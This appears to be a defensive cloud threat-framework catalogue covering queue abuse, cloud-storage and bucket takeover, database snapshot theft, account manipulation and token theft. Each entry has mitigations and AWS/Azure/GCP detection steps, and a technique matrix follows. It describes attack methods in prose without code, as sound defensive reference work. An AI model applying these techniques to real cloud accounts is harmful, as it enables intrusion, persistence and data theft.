# Abuse Queue Services(version 1.0)


**Cloud Service Label: PaaS**


Description


Both AWS and Azure have “serverless” queuing services that enable developers to decouple code elements while enabling a robust and understandable means of passing messages between them. The assumption, however, is that messages in the queue can be trusted because queues can normally only be accessed by trusted internal apps. The Nimbostratus open source tool set has introduced a module that makes it easy to inject malicious commands within an AWS SQS queue if an adversary can gain access to a process that can access the queue. Depending what other hosts are reading from the queue, an adversary could spread laterally or increase his privileges.


Examples




| **Name** | **Description** |
| --- | --- |
| Celery\_pickle | Nimbostratus module demonstrating abuse of SQS service. |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
| Coding Practices | Check queue input before consuming. Do not trust messages coming from queues not to contain potentially malicious commands. |


Detection


Although it may be possible to log all inputs that enter a queue, the amount of data to store and examine make this a potentially impractical solution currently.




| **Detection of unusual activity after exploit** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for AWS | To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
| Monitor Activity in AWS Account | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. |
| Monitor for Suspicious Activity in Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. |
| Create Log Metric Filters and Alarms for CloudTrail | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
| Create Activity Log Alerts in Azure | To create log activity alerts for deletion in the Azure Console: 1.Navigate to*Monitor’ / ‘Alerts* 2.Select*Manage alert rules* 3.Click on the Alert*Name*where Condition contains*operationName equals Microsoft.Network/networkSecurityGroups/securityRules/delete* 4.Hover a mouse over*Condition*to ensure it is set to*Whenever the Administrative Activity Log “Delete Security Rule (networkSecurityGroups/securityRules)” has “any” level with “any” status and event is initiated by “any*” |
| Create, View, and Manage Activity Alerts in Azure Monitor | To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| Azure Resource Manager Templates | Azure Resource Manager templates in the format of JSON files that can be used to configure metric alerts in Azure Monitor. These templates can be used for simple static and dynamic threshold metric alerts, availability tests, and monitoring multiple resources. |
| Enable CloudTrail across all regions in AWS | To enable CloudTrail across all regions: 1.Sign into the AWS Management Console and open the CloudTrail console 2.Click on*Trails* 3.Set necessary Trails to All option in the I column 4.Click on a trail via the link*Name*column 5.Set*Logging*to*ON* 6.Set*Apply trail to all regions*to*Yes* |
| Configure log profile to capture activity logs for all regions in Azure | To set up activity logs for all regions: 1.Navigate to Azure console 2.Go to*Activity log* 3.Select*Export* 4.Select*Subscription* 5.Check*Select all*in*Regions* 6.Select*Save* |


References


1. http://andresriancho.github.io/nimbostratus/. Accessed Feb 23, 2020


# Abusing Cloud Storage for Access(including S3/Blob manipulation)(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


Cloud storage repositories like Azure containers and AWS S3 buckets are really convenient places to store code for use by developers who are developing apps within the cloud. They can be also serve out content via HTTPS to allow public consumption of new code. Although often intended as a temporary solution while working on more challenging aspects of code development, storing code in cloud storage can unintentionally be incorporated into production, leaving consumers of this software vulnerable to code modification when a container or bucket is misconfigured. Adversaries can modify code stored in buckets to implant backdoor software to gain a foothold in what would otherwise be a well-protected enclave. If a storage bucket used for hosting code is ever deleted in the future, adversaries can reclaim the bucket name and without any special privileges stage code for unsuspecting people to invoke. This is especially problematic if web servers are pointing at the repo to fetch some forgotten piece of code.


Examples




| **Name** | **Description** |
| --- | --- |
| Hackerone | The Rocket Chat install application was grabbing code from a publicly accessible S3 bucket. When the S3 bucket was deleted, this made the situation even worse. Once a bucket is deleted, anyone with access to AWS can create a bucket of the same name. In this case putting a malicious script within the bucket and waiting for unsuspecting users of the Rocket Chat installation script to fetch and run their payload. |
| Subjack | Open source tool that automates the search for s3 buckets and other cloud resources that are registered in DNS but which no longer exist indicating a possible hijacking opportunity. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Audit | | Frequently check permissions on cloud storage to ensure proper permissions are set to deny open or unprivileged access to resources. Consider using automated resource checkers such as CloudSploit or Divvycloud. |
|  | AWS | To perform an audit via AWS it is suggested to review information such as account details (credentials, users, groups, roles, etc), mobile applications, EC2 configurations, policies, and account activity. How to audit these different factors can be found in detail at:**https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html.** |
|  | Azure | To perform an audit via Azure an administrator can review the audit logs that are recorded under Azure’s monitoring for active directory. The audit logs allow for filtering, as well as looking at users, groups, and enterprise specific information. Full details on how to access this information can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-audit-logs.** |
|  | GCP | To perform an audit via GCP the logs can be reviewed. GCP breaks this down into three categories; admin activity, data access, and system events. The audit logs can be viewed a few different ways- the console, API, or gcloud. Full details on how to view these logs, how to export, and for how to configure the retention period can be found here:**https://cloud.google.com/logging/docs/audit.** |
| Don’t Do it | | Don’t store executable code within cloud storage repos. |
| Encrypt Sensitive Information | | Encrypt data stored at rest in cloud storage. Managed encryption keys can be rotated by most providers. At a minimum, ensure an incident response plan to storage breach includes rotating the keys and test for impact on client applications. |
|  | AWS | To encrypt data at rest in an AWS environment first start by configuring the IAM roles and permissions. A policy will need to be created to specify that the data is to be encrypted and then the policy is attached to the instance. Full details on how to accomplish this can be found at:**https://aws.amazon.com/blogs/security/how-to-protect-data-at-rest-with-amazon-ec2-instance-store-encryption/**. |
|  | Azure | To encrypt data at rest in an Azure environment it can be done differently depending on the cloud service the customer is utilizing. For SaaS customers this can be enabled or available on each specific service. For PaaS customers there are specific storage and application platforms that can be used. In terms of IaaS customers this can be broken down to a couple different aspects. Encrypted storage can be enabled the same as PaaS services, utilizing other Azure services. Encrypted compute allows for all managed disks, snapshots, and images to be encrypted utilizing a service managed key. The keys are stored in the Azure key vault. Full details on how to accomplish this can be found at:**https://docs.microsoft.com/en-us/azure/security/fundamentals/encryption-atrest.** |
| Least Privilege | | All access given to users in the cloud environment should be assigned by the necessary privileges needed for team members to complete their job responsibilities.Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary . |
|  | AWS | To implement least privilege in an AWS environment IAM policies will be used. This gives the ability to allow users to perform list, read, write, permissions management, or tagging actions. AWS suggests utilizing*last accessed information*and A*WS CloudTrail event history*to get a better understanding of privileges that might be needed or reduced based on a specific role. Full details can be found at**https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege.** |
|  | Azure | To implement least privilege in an Azure environment Azure Active Directory roles will be used. Azure outlines different tasks and the least privileged role that are suggested to be associated with the task. Those details can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/roles-delegate-by-task.**To learn how to assign specific roles it can be done via the Azure Active Directory Portal. Instructions on how to assign roles can be found here:**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-manage-roles-portal.** |
|  | GCP | [To implement least privilege in GCP it](https://cloud.google.com/blog/products/application-development/least-privilege-for-cloud-functions-using-cloud-iam)is recommended to use predefined roles (which allow for granular access permissions) instead of primitive roles (roles/owner, roles/editor, and roles/viewer). Full details on the difference between types of roles can be found here:**https://cloud.google.com/iam/docs/understanding-roles.**To assign these roles IAM service accounts are used and complete details can be found at:**https://cloud.google.com/iam/docs/using-iam-securely#least\_privilege.** |


Detection


Monitor for unusual queries to the cloud provider's storage service. Activity originating from unexpected sources may indicate improper permissions are set that is allowing access to data. Audit storage locations for executable files frequently.


References


1.https://hackerone.com/reports/399166. Accessed 02/12/2020


2.https://securityonline.info/subjack-hostile-subdomain-takeover-tool/ Accessed 08/12/2020


# Accessing Data from Databases(version 1.0)


**Cloud Service Label: PaaS**


Description


Both AWS and Azure have PaaS offerings for database services that are very popular. Such services can still allow traditional database access using SQL commands from the host running the SQL instance but more interestingly, a REST-based API which enables a richer, less restricted method of controlling the database. Adversaries with some cloud credentials may be able to use this API to access data from the database that more traditional SQL access might prohibit.


Examples




| **Name** | **Description** |
| --- | --- |
| Snapshot-rds | Public Nimbostratus module that abuses ability to request a snapshot of a database. Adversary then restores DB snapshot on a host that the adversary controls. This gives adversary complete access to all table data. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Carefully assign permissions to database API | | Care must be taken to enable read access to a database without permitting additional functionality such as create snapshots. |
|  | AWS | API developers will require escalated permissions to the API gateway. Information on how to properly configure API permissions on AWS can be found here:https://docs.aws.amazon.com/apigateway/latest/developerguide/permissions.html. |
|  | Azure | There is an API permissions page within the Azure portal that can give developers the escalated permissions they need to perform their tasks, but should be monitored and only given to those who need such permissions. Microsoft documentation outlines how to give specific permissions, as well as how resource applications can expose scopes and application roles to client applications. Both can be useful when assigning correct permissions. Documentation can be found here: https://docs.microsoft.com/en-us/azure/active-directory/develop/perms-for-given-api#recommended-documents. |


Detection


In theory requests made of the API for DB table snapshots should be captured in cloud API logs such as Azure Monitor logs and CloudTrail.


References


1.<http://andresriancho.github.io/nimbostratus/>. Accessed Feb 23, 2020


# Account Manipulation(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


Account manipulation may aid adversaries in maintaining access to credentials and certain permission levels within an environment. Manipulation could consist of modifying permissions, modifying credentials, adding or changing permission groups, modifying account settings, or modifying how authentication is performed. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to subvert password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.


*Azure AD*


In Azure, an adversary can set a password for Service Principals, which is an application specific method of accessing Azure resources. This could facilitate persistence to all Azure services the SP has access to without using an actual user’s credentials. Azure also allows alternative authentication mechanisms such as SAS tokens and certificates to be created and used rather than passwords for Azure services.


*AWS*


AWS policies allow trust between user accounts in different AWS accounts by simply identifying an external Amazon account ID and assigning it to a native role within the existing AWS account. It is then up to the cloud admin to notice that this has happened and that the role assigned to the trusted account is permissible.


Examples




| **Name** | **Description** |
| --- | --- |
| Skeleton Key | This exploit is possible after an adversary compromises a server that is running an Azure agent. Once compromised the authentication flow that is used to verify credentials can be tampered with. This attack requires privileged access to complete. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| [Multi-factor Authentication](https://attack.mitre.org/mitigations/M1032) | | Use multi-factor authentication for user and privileged accounts. Do not manage Cloud portals from machines that perform user email and web browsing tasks. |
|  | *AWS* | All users should be required to utilize two factor authentication. This can be enforced by first creating a policy that would prohibit actions except those that allow a user to change their password or manage 2FA, then attaching a policy to a group that includes all user accounts where they can be allowed all access if they sign in with 2FA. Once these actions are completed it should be tested to verify the access is given correctly. To see full details on how to complete this view AWS documentation at:**https://docs.aws.amazon.com/IAM/latest/UserGuide/tutorial\_users-self-manage-mfa-and-creds.html.** |
|  | *Azure* | All users should be required to utilize two factor authentication. This can be done by creating a MFA registration policy. It can than be assigned to all users (with the ability to exclude some if need be, but is not recommended). Make sure once the policy is created and added to users that it is then being enforced, once enforced it should be tested for verification. To see full details on how to complete this view Azure documentation at:**https://docs.microsoft.com/en-us/azure/active-directory/identity-protection/howto-identity-protection-configure-mfa-policy.** |
|  | *GCP* | All users should be required to utilize two factor authentication. This can be done by first enabling it on the current account being used by admin to assign the roles, then enable two factor on an instance by instance or project by project basis, then assigning the requirements based on IAM roles and applying it to all users. To see full details on how to complete this view Azure documentation at:**https://cloud.google.com/compute/docs/oslogin/setup-two-factor-authentication.** |
| [Account Segmentation](https://attack.mitre.org/mitigations/M1030) | | Consider separating different resources under different administrative domains so that credential compromise does not put all assets in danger. In the case of Azure, multiple subscriptions can be created with different administrators that can only access resources within the subscription. The subscriptions can still belong under the same Azure account for overall accounting and administration/policy. |
| [AD Server Configuration](https://attack.mitre.org/mitigations/M1028) | | Use Cloud provided AD services rather than maintaining AD servers in the cloud. |
| [Privileged Account Management](https://attack.mitre.org/mitigations/M1026) | | Do not allow subscription-level administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems. This can be done by first limiting the access that these accounts have outside of the administrative rights, but then also monitoring (details in detection) for events that might show a compromised account. |
|  | AWS | To manage the access that privileged accounts have on the AWS cloud system to only allow administrators to perform administrative tasks on such accounts can be accomplished utilizing limited IAM administrator accounts. To configure this the administrator would have two accounts; one would have administrative rights and no basic access while the other account has basic access with no administrative rights. To limit the administrative account the IAM limited administrator would be used. This is done by creating a policy that gives a user admin rights, but disallows the other actions using the AWS command line interface. This is outlined at:[**https://aws.amazon.com/blogs/security/how-to-create-a-limited-iam-administrator-by-using-managed-policies/**](https://aws.amazon.com/blogs/security/how-to-create-a-limited-iam-administrator-by-using-managed-policies/)**.** |
|  | Azure | To manage the access that privilege accounts have on the Azure cloud system to only allow administrators to perform administrative tasks on such accounts can be accomplished utilizing limited IAM administrator accounts. To configure this the administrator would have two accounts; one would have administrative rights and no basic access while the other account has basic access with no administrative rights. To limit the administrative account the specific administrative needs can be picked from a number of options available (Azure DevOps Administrator, Billing Administrator, Cloud Application Administrator, etc.) These different options can be edited to fit the needs and limit the basic access. This is outlined at:[**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles**](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles)**.** |
|  | GCP | To manage the access that privilege accounts have on the Azure cloud system to only allow administrators to perform administrative tasks on such accounts can be accomplished utilizing limited IAM administrator accounts. To configure this the administrator would have two accounts; one would have administrative rights and no basic access while the other account has basic access with no administrative rights. To limit the administrative account pre-defined administrator accounts can be used (mobile admin, Google voice admin, help desk admin, etc.). These accounts can be used with their pre-defined settings, or modified depending on specific use cases. These can limit access to basic functionality needed. This is outlined at:[**https://support.google.com/a/answer/2405986?hl=en**](https://support.google.com/a/answer/2405986?hl=en)**.** |


Detection




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Monitoring | | Collect events that correlate with changes to account objects on systems and the domain. Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems. Especially flag events where the subject and target accounts differ or that include additional flags such as changing a password without knowledge of the old password. Use of credentials may also occur at unusual times or to unusual systems or services and may correlate with other suspicious activity |
|  | AWS | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
|  | Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |


References


1.https://www.scmagazineuk.com/hackers-manipulate-azure-agent-using-skeleton-key-attack-cloud-infrastructure/article/1681074. Accessed June 15, 2020


# Steal Application Access Token(version 1.1)


**Cloud Service Label: IaaS, P****aaS**


Description


Adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from compromised users and used in lieu of login credentials. Application credentials may also be stolen from publicly available cloud software repositories where developmental code may still have credentials hardcoded credentials for testing. This is actually quite common and automated tools exist that will scan publicly available repositories for such tokens.


Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS). OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application. For example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a "refresh" token enabling background access is awarded. With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.


Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines.


Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.


Examples




| **Name** | **Description** |
| --- | --- |
| Black Direct | Published Oauth2 vulnerability in certain first party Microsoft web sites that could enable the compromise of Azure credentials if exploited. |
| NetSPI | Documents Numerous opportunities to collect JWT tokens from within Azure applications. |
| APT28 | APT28 has used several malicious applications that abused OAuth access tokens to gain access to target email accounts, including Gmail and Yahoo Mail. |
| Azure AD Pass through Authentication (PTA) | Un-hashed credentials are passed to the connector to validate against Active Directory if Azure AD is configured with PTA. Adam Chester, aka XPN, from MDSec created a PoC leveraging DLL injection into the Azure AD Sync process, specifically the Win32 API*LogonUserW,*to parse and store credentials. |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
| Logging | Administrators can set up a variety of logs and leverage audit tools to monitor actions that can be conducted as a result of OAuth 2.0 access. For instance, audit reports enable admins to identify privilege escalation actions such as role creations or policy modifications, which could be actions performed after initial access. In Azure you can look at all authentications to Azure AD through the “sign in” blade under the Active Directory heading to determine if access has been obtained. |
| Security Services | Azure now offers security services focused specifically on identifying inappropriate use of credentials (PIM). These services include machine learning and preapproved policies that can be used to limit access to suspicious access requests. |
| Update Corporate Policies | Update corporate policies to restrict what types of third-party applications may be added to any online service or tool that is linked to the company's information, accounts or network (example: Google, Microsoft, Dropbox, Basecamp, GitHub). However, rather than providing high-level guidance on this, be extremely specific—include a list of pre-approved applications and deny all others not on the list. Administrators may also block end-user consent through administrative portals, such as by using policies within Azure, disabling users from authorizing third-party apps through OAuth and forcing administrative consent. |


Detection


Monitor access token activity for abnormal use and permissions granted to unusual or suspicious applications. Administrators can set up a variety of logs and leverage audit tools to monitor actions that can be conducted as a result of OAuth 2.0 access. For instance, audit reports enable admins to identify privilege escalation actions such as role creations or policy modifications, which could be actions performed after initial access.




| **Detection of activities after exploitation** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for AWS | To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
| Monitor Activity in AWS Account | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. |
| Monitor for Suspicious Activity in Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. |
| Create Log Metric Filters and Alarms for CloudTrail | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
| Create Activity Log Alerts in Azure | To create log activity alerts for deletion in the Azure Console: 1.Navigate to*Monitor’ / ‘Alerts* 2.Select*Manage alert rules* 3.Click on the Alert*Name*where Condition contains*operationName equals Microsoft.Network/networkSecurityGroups/securityRules/delete* 4.Hover a mouse over*Condition*to ensure it is set to*Whenever the Administrative Activity Log “Delete Security Rule (networkSecurityGroups/securityRules)” has “any” level with “any” status and event is initiated by “any*” |
| Create, View, and Manage Activity Alerts in Azure Monitor | To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| Enable CloudTrail across all regions in AWS | To enable CloudTrail across all regions: 1.Sign into the AWS Management Console and open the CloudTrail console 2.Click on*Trails* 3.Set necessary Trails to All option in the I column 4.Click on a trail via the link*Name*column 5.Set*Logging*to*ON* 6.Set*Apply trail to all regions*to*Yes* |
| Configure log profile to capture activity logs for all regions in Azure | To set up activity logs for all regions: 1.Navigate to Azure console 2.Go to*Activity log* 3.Select*Export* 4.Select*Subscription* 5.Check*Select all*in*Regions* 6.Select*Save* |


References


1.https://auth0.com/blog/why-should-use-accesstokens-to-secure-an-api/#:~:text=It%20enables%20you%20to%20authorize,verifying%20who%20the%20user%20is). Accessed September 12, 2019


2.<https://docs.microsoft.com/en-us/azure/security/fundamentals/steps-secure->identity. Accessed Feb 2, 2020


3.<https://www.cyberark.com/threat-research-blog/blackdirect-microsoft-azure-account-takeover/>. Accessed Feb 28,2020


4.<https://blog.netspi.com/gathering-bearer-tokens-azure/>. Accessed June 8, 2020


5.<https://blog.xpnsec.com/azuread-connect-for-redteam/>. Accessed July 20, 2020


6.<https://www.varonis.com/blog/azure-skeleton-key/>. Accessed July 20, 2020


# 


| **Initial Access** | **Persistence** | **Privilege Escalation** | **Defense Evasion** | **Discovery** | **Lateral Movement** | **Collection** | **Command and Control** | **Exfiltration** | **Impact** |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
|  |  |  |  |  |  |  |  |  |  |
| [Cloud Admin Portal](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Cloud%20Admin%20Portal.docx?d=wbf0b9ebe3d40494882692148ee27c853&csf=1&web=1&e=A0LxDF) |  |  |  | [Cloud Admin Portal/API](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Cloud%20Admin%20Portal.docx?d=wbf0b9ebe3d40494882692148ee27c853&csf=1&web=1&e=lY4YrI) | [Abusing Queue Services](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Abuse%20Queue%20Services.docx?d=w3a4f8bda95784fc5a38413e3c11a8749&csf=1&web=1&e=QD2oaj) |  |  |  |  |
| [Cloud InstanceMetadata API](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Cloud%20Instance%20Metadata%20API.docx?d=wd176df66da774073967e17b7c4b22ca0&csf=1&web=1&e=AX3Bhp) |  | [Managed Identities/Service Principals](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Service%20Principals.docx?d=w60fc88020f8e4ba8a93d6a89787094b2&csf=1&web=1&e=KGl2Kd) |  | [Cloud Security Discovery](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Cloud%20Security%20Discovery.docx?d=wd80fd56ead9447a29b47b74236c4344e&csf=1&web=1&e=c2zmtv) | [CloudTrail/LoggingExploits](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Cloudtrail%20Logging.docx?d=wc95399682ca9442299056f0565f8ef42&csf=1&web=1&e=SOaXRd) |  |  |  |  |
| [Credentials in Files](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Credentials%20in%20Files%201.1.docx?d=w978e7f89943c4fd8b0a769039690cada&csf=1&web=1&e=vv9HkF) | [Account Manipulation](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Account%20Manipulation.docx?d=w8a38b22b6251478ba8553282e94a32f2&csf=1&web=1&e=yfUo9W) | [Credentials in Files](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Credentials%20in%20Files%201.1.docx?d=w978e7f89943c4fd8b0a769039690cada&csf=1&web=1&e=lyxGlz) | [Cloud Log Scrubbing](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Cloud%20Log%20Scrubbing.docx?d=waa29318ecf4f424b8cf8323ed8f3ca0e&csf=1&web=1&e=Q6w5Yr) | [Discovery using Cloud APIs](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Discovery%20using%20Cloud%20APIs%201.1.docx?d=we30f30b44dbe46e4b7d64b14aa3621d0&csf=1&web=1&e=nsBjnw) | [Credentials in Files](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Credentials%20in%20Files%201.1.docx?d=w978e7f89943c4fd8b0a769039690cada&csf=1&web=1&e=dp1RKL) |  |  |  |  |
| [Exploit FaaS](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/FaaS%20exploits%201.1.docx?d=w3d7306a395b340e29e0c66f0b4c64af8&csf=1&web=1&e=A2FqY6) | [Create New Account](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Create%20Account.docx?d=w4836ffcc48bd4e72a6b86a3175cda798&csf=1&web=1&e=VrcoYO) |  | [Exploit FaaS](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/FaaS%20exploits%201.1.docx?d=w3d7306a395b340e29e0c66f0b4c64af8&csf=1&web=1&e=53zjNs) | [Exploit FaaS](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/FaaS%20exploits%201.1.docx?d=w3d7306a395b340e29e0c66f0b4c64af8&csf=1&web=1&e=9XMfkP) |  |  |  |  |  |
| [Exploit Public-FacingApplications](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Exploit%20Public.docx?d=w9c134b6e695a44eba5acde3367f9a790&csf=1&web=1&e=6fdFnS) | [Creating new FaaS - AWS LambdaAzure Functions](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Lambda.docx?d=wd512ae040f2d483e9341cd8ba3ac2d93&csf=1&web=1&e=VBd3hU) | [Abusing Queue Services](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Abuse%20Queue%20Services.docx?d=w3a4f8bda95784fc5a38413e3c11a8749&csf=1&web=1&e=OHEwBj) | [Manipulate CloudConfiguration](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Manipulate%20Cloud%20Config.docx?d=wae35a6d59acd4f6e8c2d0faceed2b9ec&csf=1&web=1&e=HT7lMy) | [Network ConnectionDiscovery](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/System%20Network%20Connections%20Discovery.docx?d=w94a73f5e05e14ed390e80c8825041139&csf=1&web=1&e=qhog8O) |  |  | Standard C&C Techniques |  |  |
| Exploit S3 Permissions | [Implant Container image](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Implant%20Container%20Image.docx?d=w83d9c2e47a5c4d1ebea1a07388ee2a0a&csf=1&web=1&e=nknhow) | [Exploit FaaS](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/FaaS%20exploits%201.1.docx?d=w3d7306a395b340e29e0c66f0b4c64af8&csf=1&web=1&e=0xZ8td) | [Redundant Access](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Redundant%20Access.docx?d=w1db751cc418c49b39eedc2c6c31f85fc&csf=1&web=1&e=q4TeRH) | [Network Service Scanning](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Network%20Service%20Scanning.docx?d=w1f92da37229a44fa99a30ae704c7a44e&csf=1&web=1&e=xtAI9m) |  |  |  |  |  |
